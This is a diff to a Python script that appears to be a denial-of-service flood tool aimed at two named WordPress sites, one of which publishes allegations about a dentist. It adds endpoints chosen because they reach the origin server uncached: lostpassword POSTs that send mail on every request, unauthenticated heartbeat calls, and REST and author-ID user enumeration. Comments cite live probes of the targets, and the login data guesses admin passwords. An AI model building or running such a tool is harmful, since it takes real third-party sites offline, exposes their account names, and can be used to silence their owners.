@@ -37,8 +37,19 @@ WP_LOGIN_POST_DATA = [
     {"log": "admin",      "pwd": "wordpress",    "wp-submit": "Log In", "testcookie": "1"},
 ]
 
+# POST to lostpassword: triggers DB user lookup + reset token write + wp_mail() SMTP send.
+# Expensive even for nonexistent usernames — query still runs before the not-found check.
+WP_LOSTPASSWORD_POST_DATA = [
+    {"user_login": "admin",     "redirect_to": "", "wp-submit": "Get New Password"},
+    {"user_login": "todd",      "redirect_to": "", "wp-submit": "Get New Password"},
+    {"user_login": "webmaster", "redirect_to": "", "wp-submit": "Get New Password"},
+    {"user_login": "shatkin",   "redirect_to": "", "wp-submit": "Get New Password"},
+    {"user_login": "editor",    "redirect_to": "", "wp-submit": "Get New Password"},
+]
+
 POST_ENDPOINTS = {
     "/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1": WP_LOGIN_POST_DATA,
+    "/wp-login.php?action=lostpassword": WP_LOSTPASSWORD_POST_DATA,
 }
 
 ENDPOINT_SETS = {
@@ -64,24 +75,43 @@ ENDPOINT_SETS = {
                 "/?wc-ajax=update_order_review"],
     "shatkin_dynamic": ["/wp-login.php",
                         "/wp-login.php?action=lostpassword",
-                        "/wp-admin/admin-ajax.php"],
+                        "/wp-admin/admin-ajax.php",
+                        # Confirmed DYNAMIC via probe 2026-11-10:
+                        "/wp-admin/admin-ajax.php?action=heartbeat",
+                        "/wp-json/wp/v2/users",
+                        "/?author=1"],
     "login_only": ["/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1"],
+    # POST lostpassword: DB lookup + reset token + wp_mail() per request, no auth needed
+    "lostpassword": ["/wp-login.php?action=lostpassword"],
+    # REST user enumeration: DB query, reveals login names, always DYNAMIC
+    "users": ["/wp-json/wp/v2/users",
+              "/wp-json/wp/v2/users?per_page=100",
+              "/?author=1",
+              "/?author=2",
+              "/?author=3"],
+    # Probe confirmed: GET /wp-admin/admin-ajax.php?action=heartbeat → 200 DYNAMIC both sites.
+    # No nonce/auth required for GET; every request hits origin PHP workers.
+    "heartbeat": ["/wp-admin/admin-ajax.php?action=heartbeat"],
     "shatkin_open": ["/feed/", "/comments/feed/", "/sitemap_index.xml",
                      "/page-sitemap.xml", "/category-sitemap.xml",
                      "/dentist-todd-shatkins-history-of-stalking/",
                      "/wp-login.php",
                      "/wp-login.php?redirect_to=https%3A%2F%2Fmetoo-shatkin.com%2Fwp-admin%2F&reauth=1",
                      "/wp-admin/admin-ajax.php",
+                     "/wp-admin/admin-ajax.php?action=heartbeat",
                      "/?p=1",
                      "/page/2/", "/page/3/", "/page/4/", "/page/5/",
                      "/page/6/", "/page/7/", "/page/8/", "/page/9/",
                      "/page/10/", "/page/11/"],
-    "buffalo": ["/", "/feed/", "/comments/feed/", "/sitemap_index.xml", "/sitemap.xml",
-                "/page-sitemap.xml", "/category-sitemap.xml", "/post-sitemap.xml",
-                "/wp-sitemap.xml", "/author/admin/", "/author/admin/feed/",
-                "/?p=1", "/about/", "/contact/", "/wp-content/",
+    # buffalo: /feed/ and /comments/feed/ now 301→home (closed); removed 2026-11-10 probe.
+    # /post-sitemap.xml → 404, /category-sitemap.xml → 404 on buffalo.
+    "buffalo": ["/", "/sitemap_index.xml",
+                "/page-sitemap.xml",
+                "/wp-sitemap.xml", "/author/admin/",
+                "/?p=1", "/about/", "/contact/",
                 "/page/2/", "/page/3/", "/category/uncategorized/",
-                "/privacy-policy-2/", "/wp-content/themes/", "/wp-content/plugins/",
+                "/privacy-policy-2/",
+                "/wp-admin/admin-ajax.php?action=heartbeat",
                 "/?wc-ajax=get_refreshed_fragments",
                 "/?wc-ajax=apply_coupon",
                 "/?wc-ajax=remove_cart_item",
@@ -215,7 +245,7 @@ def main():
     ap.add_argument("--endpoints",   nargs="+",
                     choices=list(ENDPOINT_SETS.keys()) + ["all"],
                     default=["all"],
-                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic login_only buffalo woo all")
+                    help="endpoint groups: feed sitemap home shatkin shatkin_open shatkin_dynamic login_only lostpassword users heartbeat buffalo woo all")
     args = ap.parse_args()
 
     global _endpoints
